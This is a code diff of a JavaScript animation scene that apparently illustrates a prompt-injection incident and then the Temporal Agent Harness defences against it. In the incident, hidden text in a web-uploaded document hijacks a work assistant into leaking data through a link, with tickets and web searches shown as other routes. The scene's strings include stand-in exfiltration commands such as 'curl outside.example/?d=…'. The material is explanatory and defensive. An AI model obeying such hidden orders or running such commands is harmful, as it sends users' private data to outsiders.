@@ -1,10 +1,12 @@
 // ===================== 4. A HIDDEN ORDER
 // The case file (AUGUST 2026, HIDDEN TEXT) slams in, gets its INCIDENT stamp and pins top left as evidence. The replay
-// of the researchers' demonstration: a SHARED FILES list whose new document is marked SHARED, the AI model beside it.
-// A scanner sweeps the document and reveals a hidden line, an order; it reaches the model, which turns red (a flash,
-// a jolt and a red and UV glitch of the camera), and the data leaves by three routes at once, three red action cards
-// on three red lines: a link carrying it, a ticket in an outside project, a web search whose query carries it: DATA
-// LEAKED. With Temporal, the replay slides away, the model flies to its place on the board and calms down, and the
+// of the researchers' demonstration: a SHARED FILES list whose new document, uploaded from the web, is marked NEW, the
+// AI model beside it and the assistant's three tools on the right. A scanner sweeps the document and reveals a hidden
+// line, an order; it reaches the model, which turns red (a flash, a jolt and a red and UV glitch of the camera), and
+// the data leaves by a link: a red action card on a red line, open_link with the data in its address: DATA LEAKED. A
+// ticket in an outside project and a web search whose query carries the data follow on dashed lines, marked POSSIBLE:
+// other routes the same trick could take. With Temporal, the replay slides away, the model flies to its place on the
+// board and calms down, and the
 // board builds round it: on the right, YOUR WORKERS (shared files, tickets and web search, the last two marked DATA
 // OUT) over a glass SANDBOX (no keys, no internet), every tool on a lane from the checkpoint. The Q3 plan comes back
 // from the shared files through the checkpoint: a red ripple, the Event History writes `outside content read`
@@ -13,10 +15,11 @@
 // tries route after route: a terminal call passes into the sandbox and hits its glass wall (NO INTERNET); a ticket to
 // an outside project stops at the checkpoint, which holds it (NEEDS APPROVAL) as the run is flagged and the step
 // sends data out. The model steps up and aside for Maya's phone, which shows the data and the document it came from;
-// the three routes light up converging on the checkpoint (WHATEVER ROUTE), and Maya taps Reject: the checkpoint
+// the three routes light up converging on the checkpoint (EVERY WAY OUT), and Maya taps Reject: the checkpoint
 // shuts, REJECTED BY MAYA, on record. Then the workers and the sandbox slide away for the Temporal Agent Harness's
-// TOOL APPROVAL POLICY: three rules light up in the subtitle's order, read_file RUN, delete_volume REFUSED (the reason
-// goes back to the model), create_ticket to an outside project ASK A PERSON, whose violet line reaches Maya's phone.
+// TOOL APPROVAL POLICY: three rules light up in the subtitle's order, read_file RUN (an allowed tool), create_ticket
+// ASK A PERSON (not on the allowed list), whose violet line reaches Maya's phone, and delete_volume REFUSED by auto
+// mode's rule on its arguments, the reason sent back to the model.
 // The camera zoom-through (setCamera) brings the scene in and plays into chapter 5.
 // The block keeps every name declared in this file local to this scene.
 {
@@ -36,21 +39,28 @@
   const REPLAY_ORB = { x: 1000, y: DOCUMENT.y };
   // the reading link from the panel's right edge to 16 px short of the orb
   const LINK = { x0: FILES.x + FILES.w / 2, x1: REPLAY_ORB.x - BOARD.model.size / 2 - 16, y: DOCUMENT.y };
-  // the three routes the data leaves by: an action card each, its argument carrying the data. They rest in a column
-  // on the right, left-aligned on LEAK_LEFT, 150 px apart round the document's line (y 362-738); each one's red line
-  // runs from 16 px right of the orb to 16 px short of its card
+  // the assistant's three tools and the routes the data can leave by: a tool tile each, then an action card that lands
+  // on it, its argument carrying the data. They rest in a column on the right (x 1380-1800), 150 px apart round the
+  // document's line (y 362-738); each one's line runs from 16 px right of the orb to 16 px short of its card. Only
+  // open_link is the demonstrated leak (the assistant opened an outside address with the data appended); the other
+  // two are possible routes, dashed and marked POSSIBLE.
   const LEAK_LEFT = 1380;
+  const LEAK_W = 420;
   const LEAKS = [
-    { tool: 'open_link', arg: 'outside.example/?d=PRJ-1042…', icon: 'globe', y: 400 },
-    { tool: 'create_ticket', arg: 'outside project: PRJ-1042…', icon: 'ticket', y: 550 },
-    { tool: 'web_search', arg: 'q="PRJ-1042 roadmap…"', icon: 'search', y: 700 },
+    { tool: 'open_link', arg: 'outside.example/?d=PRJ-1042…', icon: 'globe', y: 400, leaked: true },
+    { tool: 'create_ticket', arg: 'outside project: PRJ-1042…', icon: 'ticket', y: 550, leaked: false },
+    { tool: 'web_search', arg: 'q="PRJ-1042 roadmap…"', icon: 'search', y: 700, leaked: false },
   ];
   const LEAK_FROM = REPLAY_ORB.x + BOARD.model.size / 2 + 16;
+  // a possible route's card, at rest: slightly dimmed, as it did not happen
+  const POSSIBLE_O = 0.72;
+  // the action cards' argument size: a value in a held shot reads at 18 px or more (ACTION_CARD.argFont is 17)
+  const ARG_FONT = 18;
   // the x where each flying card's curve turns from the orb's line to its own
   const LEAK_BEND = 1200;
 
-  // ---------- the board half: the model and the checkpoint at BOARD's places, the Event History strip at
-  // BOARD.history; on the right, in BOARD.tools' column (x 1380-1800), the YOUR WORKERS zone (y 182-520) holding three
+  // ---------- the board half: the model and the checkpoint at BOARD's places, the Event History strip at HISTORY
+  // (below); on the right, in BOARD.tools' column (x 1380-1800), the YOUR WORKERS zone (y 182-520) holding three
   // tool tiles 84 px apart, then the SANDBOX box 24 px under it (y 544-856), its bottom level with the Event History's
   const { laneY } = BOARD;
   const GATE_RIGHT = BOARD.checkpoint.x + CHECKPOINT.w / 2;
@@ -73,6 +83,9 @@
   // (the sandboxed Worker still reaches Temporal, hence no internet rather than no network)
   const BOX_BADGES = [['keyOff', 'No keys'], ['wifiOff', 'No internet']];
   const BOX_REST = [BOX.x, 676];
+  // the terminal call the agent sends into the sandbox, and the ticket it sends to an outside project
+  const CALL = { tool: 'terminal', arg: 'curl outside.example/?d=…' };
+  const TICKET = { tool: 'create_ticket', arg: 'outside project: PRJ-1042…' };
   // the lanes from the checkpoint's right edge: one to each zone tool, level with it, and one to the sandbox, level
   // with the call's rest; each one's Bezier control points, for the cards and chips that ride it
   const LANE_ENDS = [...ZONE_TOOLS.map((_, i) => zoneSlot(i)[1]), BOX_REST[1]];
@@ -90,12 +103,16 @@
     [BOARD.model.x + 64, laneY - 64], [480, 200], [700, 150],
     [FLAG_SPOT[0] - FLAG_BADGE.w / 2 - 6, FLAG_SPOT[1]],
   ];
-  // Maya's phone on the left, its bottom on the Event History's bottom edge; the model, stepped up and aside above it
-  // at 2/3 of its size, 40 px clear of the phone's top. Its AI MODEL label fades out there: the red glow of the fooled
-  // model reaches the content frame's top edge (y 148), and the label would crowd the phone.
-  const PHONE = { x: BOARD.model.x, y: BOARD.history.y + BOARD.history.h / 2 - APPROVAL_CARD.h / 2 };
-  const ORB_ASIDE = { x: BOARD.model.x, y: 256, scale: 2 / 3 };
-  // the WHATEVER ROUTE caption over the lanes, between the checkpoint and the zone, level with the zone's heading
+  // the Event History strip, 720 px wide (x 600-1320) where BOARD.history is 800: 60 px clear of the sandbox and of
+  // the policy panel (x 1380); same center, so its bottom stays on the phone's and the sandbox's (y 856)
+  const HISTORY = { ...BOARD.history, w: 720 };
+  // Maya's phone on the left (x 140-460, as in chapter 3), its bottom on the Event History's bottom edge; the model,
+  // stepped up and aside above it at 2/3 of its size, 40 px clear of the phone's top. Its AI MODEL label fades out
+  // there: the red glow of the fooled model reaches the content frame's top edge (y 148), and the label would crowd
+  // the phone.
+  const PHONE = { x: 300, y: HISTORY.y + HISTORY.h / 2 - APPROVAL_CARD.h / 2 };
+  const ORB_ASIDE = { x: PHONE.x, y: 256, scale: 2 / 3 };
+  // the EVERY WAY OUT caption over the lanes, between the checkpoint and the zone, level with the zone's heading
   const CAPTION = { x: LANE_MID, y: ZONE.y - ZONE.h / 2 + 37, w: 220 };
   const HISTORY_ROWS = [
     '<b>outside content read</b> Q3 plan',
@@ -105,14 +122,17 @@
 
   // ---------- the beats
   // from c[0]: the case file slams in (file), pins as evidence (pin, pinD); the shared files panel rises in, the new
-  // document drops into it, the orb pops in and the reading link draws
-  const T0 = { file: 0.3, pin: 3.4, pinD: 0.8, files: 3.8, doc: 4.3, orb: 4.5, link: 5.0 };
+  // document drops into it, the orb pops in, the assistant's tools slide in one after the other (tools, toolStep),
+  // the reading link draws, then the tools' lanes (lanes)
+  const T0 = {
+    file: 0.3, pin: 3.4, pinD: 0.8, files: 3.8, doc: 4.3, orb: 4.5, tools: 4.7, toolStep: 0.12, link: 5.0, lanes: 5.1,
+  };
   // from c[1]: the scanner sweeps the document (scan, scanD), the HIDDEN TEXT tag pops (label); the order travels the
-  // link to the model (read, readD), which turns red (hijack, with its glitch glitchD long); the three routes leave
-  // one after the other (leaks, leakStep, leakD); DATA LEAKED lands (leaked)
+  // link to the model (read, readD), which turns red (hijack, with its glitch glitchD long); the link leaves
+  // (leaks[0]) and DATA LEAKED lands (leaked); the two possible routes follow (leaks[1], leaks[2]), each leakD long
   const T1 = {
     scan: 0.4, scanD: 1.3, label: 1.6, read: 2.0, readD: 0.5, hijack: 2.6, glitchD: 0.4,
-    leaks: 3.0, leakStep: 0.3, leakD: 0.8, leaked: 4.7,
+    leaks: [3.0, 4.4, 4.7], leakD: 0.8, leaked: 3.9,
   };
   // from c[2]: the replay slides away (out, outD) as the orb flies to the board and calms down (fly, flyD); the zone
   // and its tools slide in, the box after them, the checkpoint pops in, the lanes draw, the history rises. The Q3 plan
@@ -136,27 +156,36 @@
   // the routes that light up, as lane indices: tickets, web search, the sandbox
   const ROUTE_LANES = [1, 2, 3];
   // from c[4]: the zone, the sandbox and their lanes slide away (out, outD) as the policy panel slides in (policy);
-  // its rules light up in the subtitle's order: run, refuse, ask (lit, by row); the ASK row's line draws to Maya's
-  // phone (link, linkD), which glows violet as it arrives
-  const T4 = { out: 0, outD: 0.5, policy: 0.3, lit: [1.3, 3.5, 2.4], link: 3.7, linkD: 0.7 };
+  // its rules light up in the subtitle's order: run, ask, refuse (lit, by row); the ASK row's line draws to Maya's
+  // phone (link, linkD), which glows violet as it arrives; the refused row's reason line slides in (reason)
+  const T4 = { out: 0, outD: 0.5, policy: 0.3, lit: [1.6, 3.0, 4.4], link: 3.3, linkD: 0.7, reason: 4.8 };
 
   // ---------- the Temporal Agent Harness's tool approval policy, in the right column the zone and the sandbox leave:
-  // its top on the phone's, its bottom on the Event History's. Its heading, then three rule rows 20 px apart, the
-  // middle one level with the line to Maya's phone, which runs under the checkpoint (bottom y 610) and over the Event
-  // History (top y 680), from the ASK row's left edge to the phone's right edge
+  // its top on the phone's, its bottom on the Event History's (y 356-856). Its heading, then three rule rows 20 px
+  // apart (rows.h: each one's height, the last one holds a third line), 20 px above the panel's bottom; the middle one
+  // level with the line to Maya's phone (y 644), which runs under the checkpoint (bottom y 610) and over the Event
+  // History (top y 680), from the ASK row's left edge to the phone's right edge. In a row, the tool name (32 px high)
+  // and its lines (24 px high), 4 px apart, are centered.
   const POLICY = { x: 1590, y: 606, w: 420, h: 500 };
-  const RULE_ROW = { w: 372, h: 108, top: 112, pitch: 128 };
-  const LINK_Y = POLICY.y - POLICY.h / 2 + RULE_ROW.top + RULE_ROW.pitch + RULE_ROW.h / 2;
-  // each rule: the tool, the case it covers or what follows, and its verdict as a statusTag kind of this theme
+  const RULE_ROW = { w: 372, top: 112, gap: 20, h: [104, 104, 120], nameH: 32, lineH: 24, lineGap: 4 };
+  const ruleRowTop = i => RULE_ROW.top + RULE_ROW.h.slice(0, i).reduce((sum, h) => sum + h + RULE_ROW.gap, 0);
+  const LINK_Y = POLICY.y - POLICY.h / 2 + ruleRowTop(1) + RULE_ROW.h[1] / 2;
+  // each rule, as the harness reads it: an allowed tool runs; a tool off the allowed list asks a person; in auto
+  // mode, a rule on a call's arguments can refuse it, and the reason goes back to the model as the call's result. The
+  // tool, its lines (the last one of a refused tool is its reason, red once refused) and its verdict as a statusTag
+  // kind of this theme.
   const RULES = [
-    { tool: 'read_file', note: 'files in the project', verdict: 'RUN', kind: 'safe', rgb: RGB.neon, color: C.neon },
     {
-      tool: 'create_ticket', note: 'outside project', verdict: 'ASK A PERSON', kind: 'approval', rgb: RGB.violet,
-      color: C.violet,
+      tool: 'read_file', lines: ['allowed: inherently safe'], verdict: 'RUN', kind: 'safe', rgb: RGB.neon,
+      color: C.neon,
     },
     {
-      tool: 'delete_volume', note: 'reason sent to the model', verdict: 'REFUSED', kind: 'alarm', rgb: RGB.red,
-      color: C.red,
+      tool: 'create_ticket', lines: ['not on the allowed list'], verdict: 'ASK A PERSON', kind: 'approval',
+      rgb: RGB.violet, color: C.violet,
+    },
+    {
+      tool: 'delete_volume', lines: ['auto mode: a rule on its arguments', 'reason sent to the model'],
+      verdict: 'REFUSED', kind: 'alarm', rgb: RGB.red, color: C.red,
     },
   ];
 
@@ -182,9 +211,10 @@
       paddingLeft: '20px', textAlign: 'left',
     });
 
-  // The new document: a white card with who shared it, a SHARED marker, its bold name, two lines of body (grey bars)
-  // and the hidden order. The order shows twice: a ghost nearly the color of the paper, and a red copy the scanner
-  // reveals from the top (doc.order's clip), over a red tint (doc.tint), with a HIDDEN TEXT tag (doc.tag).
+  // The new document: a white card with where it came from (the web: someone uploaded a document found online), a
+  // NEW marker, its bold name, two lines of body (grey bars) and the hidden order. The order shows twice: a ghost
+  // nearly the color of the paper, and a red copy the scanner reveals from the top (doc.order's clip), over a red tint
+  // (doc.tint), with a HIDDEN TEXT tag (doc.tag).
   const makeDocument = root => {
     const lines = HIDDEN.lines.join('<br>');
     const order = (color, cls = '') => `<div class="mono ${cls}" style="position:absolute;left:24px;`
@@ -193,12 +223,12 @@
     const bar = (top, w) => `<div style="position:absolute;left:24px;top:${top}px;width:${w}px;height:10px;`
       + 'border-radius:5px;background:#D5DAE3"></div>';
     const doc = E(root,
-      `<div class="mono" style="position:absolute;left:24px;top:22px;font-size:16px;line-height:22px;`
-      + `color:${C.slateDark}">Shared by: guest@outside.example</div>`
-      + '<div class="mono" style="position:absolute;right:24px;top:18px;height:28px;display:flex;align-items:center;'
-      + `gap:8px;padding:0 12px 0 calc(12px + .12em);background:${C.uv};color:#FFFFFF;font-size:14px;`
-      + 'line-height:28px;letter-spacing:.12em;border-radius:var(--rs)">'
-      + `${ICON('user', 14, '#FFFFFF', 2.4)}SHARED</div>`
+      '<div class="mono" style="position:absolute;left:24px;top:20px;height:24px;display:flex;align-items:center;'
+      + `gap:8px;font-size:18px;line-height:24px;color:${C.slateDark}">${ICON('globe', 18, C.slateDark, 2)}`
+      + 'Uploaded from the web</div>'
+      + '<div class="mono" style="position:absolute;right:24px;top:18px;height:28px;'
+      + `padding:0 12px 0 calc(12px + .12em);background:${C.uv};color:#FFFFFF;font-size:14px;`
+      + 'line-height:28px;letter-spacing:.12em;border-radius:var(--rs)">NEW</div>'
       + '<div style="position:absolute;left:24px;top:56px;height:32px;display:flex;align-items:center;gap:10px;'
       + `font-size:26px;line-height:32px;font-weight:600">${ICON('file', 26, C.bg, 2)}Q3 plan</div>`
       + bar(108, 420) + bar(130, 300)
@@ -214,6 +244,50 @@
     doc.tint = doc.querySelector('.tint');
     doc.tag = doc.querySelector('.tag');
     return doc;
+  };
+
+  // One of the assistant's tools in the replay: a dark tile of an action card's size, its icon and tool name where the
+  // card that lands on it shows them
+  const makeReplayTool = (root, { tool, icon }) => E(root,
+    `${ICON(icon, 32, C.slate, 1.9)}<span class="mono" style="font-size:${ACTION_CARD.toolFont}px;line-height:28px;`
+    + `font-weight:700;color:var(--ink)">${tool}</span>`,
+    'tile', {
+      width: LEAK_W + 'px', height: ACTION_CARD.h + 'px', display: 'flex', alignItems: 'center', gap: '14px',
+      paddingLeft: (ACTION_CARD.padX + ACTION_CARD.edge) + 'px', textAlign: 'left',
+    });
+
+  // The width of an action card whose argument reads at ARG_FONT: its longest line, as makeActionCard's, always even
+  const cardWidth = ({ tool, arg, icon }) => {
+    const { toolFont, padX, edge } = ACTION_CARD;
+    const iconW = icon ? 32 + 14 : 0;
+    const textW = Math.max(tool.length * 0.6 * toolFont, arg.length * 0.6 * ARG_FONT);
+    return 2 * Math.ceil((textW + iconW + 2 * padX + edge) / 2);
+  };
+  // An action card whose argument reads at ARG_FONT (card.arg: that line), cardWidth() wide or w px when given
+  const makeCard = (root, spec, w = cardWidth(spec)) => {
+    const card = makeActionCard(root, spec);
+    card.arg = card.el.querySelectorAll('.mono')[1];
+    card.arg.style.fontSize = ARG_FONT + 'px';
+    card.w = w;
+    card.el.style.width = w + 'px';
+    return card;
+  };
+
+  // The POSSIBLE marker of a route that did not happen: a dashed slate tag at the card's top right, level with its
+  // tool name
+  const addPossibleMarker = card => E(card.el, 'Possible', 'mono', {
+    left: 'auto', right: ACTION_CARD.padX + 'px', top: '14px', width: '102px', height: '24px', paddingLeft: '.12em',
+    border: `1px dashed ${C.slateDark}`, borderRadius: '4px', color: C.slateDark, fontSize: '14px',
+    lineHeight: '22px', letterSpacing: '.12em', textAlign: 'center', textTransform: 'uppercase', opacity: 1,
+  });
+
+  // The board's Event History strip (makeHistoryStrip's look) at HISTORY's width
+  const makeHistory = (root, rowsHtml) => {
+    const { rowTop, pitch, rowH, font } = HISTORY_STRIP;
+    return makeHistoryCard(root, rowsHtml, {
+      w: HISTORY.w, h: HISTORY.h, headerFont: 16, rowTop: i => rowTop + i * pitch, font, rowH, padY: 2,
+      tagTop: i => rowTop + i * pitch + 3, tagRight: 30, tag: { font: 14, padY: 3, icon: 14 },
+    });
   };
 
   // A tool tile of the zone (TOOL_TILE's size and look): its icon and label, and for a tool that sends data out, a
@@ -291,8 +365,10 @@
 
   // The policy panel: a tile with its heading (the Temporal symbol, TEMPORAL AGENT HARNESS) and TOOL APPROVAL POLICY
   // under it, then a row per rule (panel.rows): the tool name in bold mono, its verdict tag on the right (row.tag,
-  // hidden until the rule lights up) and its note under the name (row.note)
+  // hidden until the rule lights up) and its lines under the name, in the text font (row.lines). The lines read at
+  // 18 px: the longest one, 34 characters, would not fit the row in mono.
   const makePolicyPanel = root => {
+    const { nameH, lineH, lineGap } = RULE_ROW;
     const panel = E(root,
       '<div class="lbl" style="position:absolute;left:24px;top:20px;height:34px;display:flex;align-items:center;'
       + `gap:10px;padding-left:0;font-size:18px;color:var(--ink)"><img src="${TEMPORAL_SYMBOL}" `
@@ -300,19 +376,24 @@
       + '<div class="mono" style="position:absolute;left:24px;top:60px;font-size:16px;line-height:22px;'
       + `letter-spacing:.12em;color:${C.slate}">TOOL APPROVAL POLICY</div>`,
       'tile', { width: POLICY.w + 'px', height: POLICY.h + 'px', textAlign: 'left' });
-    panel.rows = RULES.map(({ tool, note, verdict, kind }, i) => {
+    panel.rows = RULES.map(({ tool, lines, verdict, kind }, i) => {
+      const h = RULE_ROW.h[i];
+      const contentTop = (h - nameH - lines.length * (lineH + lineGap)) / 2;
+      const lineTop = k => contentTop + nameH + lineGap + k * (lineH + lineGap);
       const row = E(panel,
-        '<div class="mono" style="position:absolute;left:16px;top:18px;height:32px;display:flex;align-items:center;'
-        + `font-size:18px;font-weight:700;color:var(--ink)">${tool}</div>`
-        + '<div class="note mono" style="position:absolute;left:16px;top:58px;font-size:16px;line-height:22px;'
-        + `color:${C.slate}">${note}</div>`,
+        `<div class="mono" style="position:absolute;left:16px;top:${contentTop}px;height:${nameH}px;display:flex;`
+        + `align-items:center;font-size:18px;font-weight:700;color:var(--ink)">${tool}</div>`
+        + lines.map((text, k) => `<div class="line" style="position:absolute;left:16px;top:${lineTop(k)}px;`
+          + `font-size:18px;line-height:${lineH}px;white-space:nowrap;color:${C.slate}">${text}</div>`).join(''),
         'tile', {
-          left: (POLICY.w - RULE_ROW.w) / 2 - 1 + 'px', top: RULE_ROW.top + i * RULE_ROW.pitch - 1 + 'px',
-          width: RULE_ROW.w + 'px', height: RULE_ROW.h + 'px', background: C.bg, opacity: 1,
+          left: (POLICY.w - RULE_ROW.w) / 2 - 1 + 'px', top: ruleRowTop(i) - 1 + 'px',
+          width: RULE_ROW.w + 'px', height: h + 'px', background: C.bg, opacity: 1,
         });
-      row.note = row.querySelector('.note');
+      row.lines = [...row.querySelectorAll('.line')];
       row.tag = statusTag(row, { font: 16, padX: 10, padY: 4, icon: 16 });
-      Object.assign(row.tag.style, { left: 'auto', right: '16px', top: '18px', lineHeight: '22px', fontWeight: 700 });
+      Object.assign(row.tag.style, {
+        left: 'auto', right: '16px', top: contentTop + 1 + 'px', lineHeight: '22px', fontWeight: 700,
+      });
       setStatus(row.tag, verdict, kind);
       return row;
     });
@@ -350,13 +431,13 @@
       { text: "No filter catches every trick: a fooled agent can hide data in a link, a ticket or a search." },
       { text: "With Temporal, the Workflow notes that outside content came in, and the model cannot erase that note." },
       {
-        text: "From then on, any step that sends data out waits for a person, whatever route the agent picks.",
+        text: "From then on, any step that reaches outside waits for a person, and the box has no other way out.",
         // Maya rejects at c[3] + 6.0, then the verdict holds
         after: 2.0,
       },
       {
-        // the line to Maya's phone lands at c[4] + 4.4, which leaves the policy about 1.7 s on screen
-        text: "With the Temporal Agent Harness, each tool gets its rule: run, refuse, or ask a person.",
+        // the refused row's reason lands at c[4] + 5.1, then the policy holds
+        text: "With the Temporal Agent Harness, allowed tools run; others wait for a person or a rule that can refuse.",
       },
     ],
     build(stage, s) {
@@ -377,7 +458,9 @@
       s.checkpoint = makeCheckpoint(root, BOARD.checkpoint);
       s.flagRipples = makeRipples(root, 2, RGB.red);
       // the terminal call's request at the sandbox's right wall, the wall's red flash and the sparks of the hit
-      s.request = path(boardSvg, `M ${BOX_REST[0] + 154} ${BOX_REST[1]} H ${BOX.x + BOX.w / 2 - 6}`, C.red, 4, false);
+      // (from 5 px right of the call's card at rest to 6 px short of the wall)
+      const requestFrom = BOX_REST[0] + cardWidth(CALL) / 2 + 5;
+      s.request = path(boardSvg, `M ${requestFrom} ${BOX_REST[1]} H ${BOX.x + BOX.w / 2 - 6}`, C.red, 4, false);
       s.wallFlash = E(root, '', '', {
         width: '6px', height: '140px', borderRadius: '3px', background: C.red,
         boxShadow: glowShadow(RGB.red, 1, { blur: 24, alpha: 0.9, spread: 4 }),
@@ -395,14 +478,26 @@
       const replaySvg = svgLayer(root);
       s.link = path(replaySvg, `M ${LINK.x0} ${LINK.y} H ${LINK.x1}`, C.lineLight, 2, false, '8 8');
       s.readSpark = makeSpark(root, 18, RGB.red);
-      // the three routes: their red lines, then their cards, under the orb they grow out of
+      // the assistant's tools and their grey lanes; then the routes: their lines (solid red for the leak, dashed for
+      // the possible ones), then their cards, under the orb they grow out of. The leak's card is red; a possible
+      // one keeps a slate edge and argument, and its POSSIBLE marker
+      s.replayTools = LEAKS.map(leak => makeReplayTool(root, leak));
+      s.toolLanes = LEAKS.map(leak => path(replaySvg, sCurveD(LEAK_FROM, REPLAY_ORB.y, LEAK_LEFT - 16, leak.y),
+        C.line, 2, false));
       s.leaks = LEAKS.map(leak => {
-        const card = makeActionCard(root, leak);
-        card.setTone('red');
-        card.el.querySelectorAll('.mono')[1].style.color = C.red;
+        const card = makeCard(root, leak, LEAK_W);
+        const d = sCurveD(LEAK_FROM, REPLAY_ORB.y, LEAK_LEFT - 16, leak.y);
+        if (leak.leaked) {
+          card.setTone('red');
+          card.arg.style.color = C.red;
+          card.line = path(replaySvg, d, C.red, 2, false);
+        } else {
+          card.el.style.borderLeftColor = C.slate;
+          addPossibleMarker(card);
+          card.line = path(replaySvg, d, `rgba(${RGB.red},.6)`, 2, false, '8 8');
+        }
         const rest = [LEAK_LEFT + card.w / 2, leak.y];
         card.curve = [[REPLAY_ORB.x, REPLAY_ORB.y], [LEAK_BEND, REPLAY_ORB.y], [LEAK_BEND, leak.y], rest];
-        card.line = path(replaySvg, sCurveD(LEAK_FROM, REPLAY_ORB.y, LEAK_LEFT - 16, leak.y), C.red, 2, false);
         return card;
       });
       s.leaked = agentTag('DATA LEAKED', 'red', root);
@@ -412,18 +507,16 @@
       s.chipRoute1 = [zoneSlot(0), [COLUMN_LEFT, LANE_ENDS[0]], ...curvePoints(laneCurve(LANE_ENDS[0])).reverse(),
         [BOARD.checkpoint.x, laneY]];
       s.chipRoute2 = [[BOARD.checkpoint.x, laneY], [BOARD.model.x, laneY]];
-      s.call = makeActionCard(root, { tool: 'terminal', arg: 'curl outside.example/?d=…' });
-      s.call.arg = s.call.el.querySelectorAll('.mono')[1];
+      s.call = makeCard(root, CALL);
       s.callStops = actionStops(s.call, 0);
       s.callRoute = [s.callStops.gate, ...curvePoints(laneCurve(BOX_REST[1])), BOX_REST];
-      s.ticket = makeActionCard(root, { tool: 'create_ticket', arg: 'outside project: PRJ-1042…' });
-      s.ticket.arg = s.ticket.el.querySelectorAll('.mono')[1];
+      s.ticket = makeCard(root, TICKET);
       s.ticketStops = actionStops(s.ticket, 1);
 
       // the orb, in a mount that scales it when it steps aside (class cam: the layout check measures it as shown)
       s.orbMount = E(root, '', 'cam', { width: 0, height: 0, opacity: 1 });
       s.orb = makeModelOrb(s.orbMount, { x: 0, y: 0, size: BOARD.model.size, seed: 2.1 });
-      s.history = makeHistoryStrip(root, HISTORY_ROWS);
+      s.history = makeHistory(root, HISTORY_ROWS);
 
       // ---------- the FLAGGED badge, the model's tendril at it, the verdicts and the caption
       s.flag = makeFlagBadge(root);
@@ -435,7 +528,7 @@
       s.lockSparks = Array.from({ length: 6 }, () => makeGlowDot(root, 8, RGB.ink, { blur: 10 }));
       s.needs = agentTag('NEEDS APPROVAL', 'violet', root);
       s.rejected = agentTag('REJECTED BY MAYA', 'red', root);
-      s.caption = E(root, 'Whatever route', 'lbl', {
+      s.caption = E(root, 'Every way out', 'lbl', {
         width: CAPTION.w + 'px', fontSize: '16px', lineHeight: '20px', textAlign: 'center', color: C.violet,
       });
 
@@ -445,11 +538,11 @@
         question: 'Send data to an<br>outside project?'
           + `<div class="mono" style="margin-top:18px;font-size:14px;line-height:18px;letter-spacing:.12em;`
           + `color:${C.slate}">DATA</div>`
-          + '<div class="mono" style="font-size:16px;line-height:22px">PRJ-1042, wiki: roadmap</div>'
+          + '<div class="mono" style="font-size:18px;line-height:24px">PRJ-1042, wiki: roadmap</div>'
           + `<div class="mono" style="margin-top:10px;font-size:14px;line-height:18px;letter-spacing:.12em;`
           + `color:${C.slate}">FROM</div>`
-          + `<div class="mono" style="font-size:16px;line-height:22px;color:${C.red};display:flex;align-items:center;`
-          + `gap:6px">${ICON('flag', 16, C.red, 2.2)}Q3 plan, shared by guest</div>`,
+          + `<div class="mono" style="font-size:18px;line-height:24px;color:${C.red};display:flex;align-items:center;`
+          + `gap:6px">${ICON('flag', 18, C.red, 2.2)}Q3 plan, from the web</div>`,
         deadline: 'Answer by 18:00',
       });
 
@@ -462,14 +555,14 @@
 
       // the case file lands over everything
       s.caseFile = makeCaseFile(root, {
-        date: 'AUGUST 2026', tag: 'HIDDEN TEXT', headline: 'A shared document takes over<br>a work assistant',
+        date: 'AUGUST 2026', tag: 'HIDDEN TEXT', headline: 'A document takes over<br>a work assistant',
         source: 'PROMPTARMOR, AUG 2026',
       });
       // the flash covers the stage, outside the camera
       s.flash = makeFlash(stage);
     },
     update(t, c, s) {
-      const { model, checkpoint, history } = BOARD;
+      const { model, checkpoint } = BOARD;
       const hijackAt = c[1] + T1.hijack;
       const outAt = c[2] + T2.out;
       const flagAt = c[2] + T2.chip + T2.chipD1;
@@ -504,7 +597,7 @@
         { o: replayO, to: { ...CASE_FILE.pin, y: CASE_FILE.pin.y - Math.round(60 * out) } });
 
       // 2. the replay. The shared files panel rises in with its older rows; the new document drops into its top slot,
-      // marked SHARED
+      // marked NEW
       const filesIn = P(t, c[0] + T0.files, 0.6);
       const filesDy = Math.round(30 * (1 - filesIn));
       place(s.files, FILES.x + leftX, FILES.y + filesDy, 1, filesIn * replayO);
@@ -530,13 +623,21 @@
       draw(s.link, P(t, c[0] + T0.link, 0.5), replayO);
       sparkOnPath(s.readSpark, s.link, P(t, readAt, T1.readD, linear), replayO);
 
-      // the data leaves by three routes at once: each card grows out of the model and rides its red line to its
-      // place on the right
+      // the assistant's tools slide in on the right, one after the other, and their grey lanes draw from the model.
+      // Then the data leaves: each card grows out of the model and rides its line onto its tool, whose tile and lane
+      // give way to it; the link first, then the two possible routes, which rest dimmed
       s.leaks.forEach((card, i) => {
-        const u = P(t, c[1] + T1.leaks + i * T1.leakStep, T1.leakD);
+        const leak = LEAKS[i];
+        const u = P(t, c[1] + T1.leaks[i], T1.leakD);
+        const toolIn = P(t, c[0] + T0.tools + i * T0.toolStep, 0.6);
+        place(s.replayTools[i], LEAK_LEFT + LEAK_W / 2 + Math.round(60 * (1 - toolIn)) + rightX, leak.y, 1,
+          toolIn * (1 - P(u, 0.85, 0.15, linear)) * replayO);
+        draw(s.toolLanes[i], P(t, c[0] + T0.lanes + i * T0.toolStep, 0.5), replayO * (1 - P(u, 0, 0.6, linear)));
+        s.toolLanes[i].style.transform = `translateX(${rightX}px)`;
         const [x, y] = bezier(card.curve, u);
         const k = lerp(0.4, 1, P(u, 0, 0.3, linear));
-        card.place(Math.round(x) + rightX, Math.round(y), k, Math.min(1, u * 6) * replayO);
+        const restO = leak.leaked ? 1 : lerp(1, POSSIBLE_O, P(u, 0.8, 0.2, linear));
+        card.place(Math.round(x) + rightX, Math.round(y), k, Math.min(1, u * 6) * restO * replayO);
         draw(card.line, u, replayO);
         card.line.style.transform = `translateX(${rightX}px)`;
       });
@@ -566,7 +667,7 @@
       const lanesIn = P(t, c[2] + T2.lanes, T2.lanesD);
       draw(s.laneIn, lanesIn, 1 - aside);
       s.lanes.forEach((lane, i) => draw(lane, P(t, c[2] + T2.lanes + 0.1 * i, T2.lanesD), kept));
-      rise(s.history, history.x, history.y, P(t, c[2] + T2.history, 0.6));
+      rise(s.history, HISTORY.x, HISTORY.y, P(t, c[2] + T2.history, 0.6));
 
       // the AI model: it pops in beside the shared files and looks at them, turns red as the order reaches it and
       // watches the data leave; with Temporal it flies to its place on the board, calming down, turns red again as
@@ -682,8 +783,8 @@
       if (t >= rejectAt) s.history.tags[2].style.transform = `scale(${swell(t, rejectAt + 0.1, 0.14)})`;
 
       // 5. the Temporal Agent Harness: the tool approval policy slides in where the zone and the sandbox were. Each
-      // rule lights up in its verdict's color as its tag pops: run, refuse (its note turns red: the reason goes back
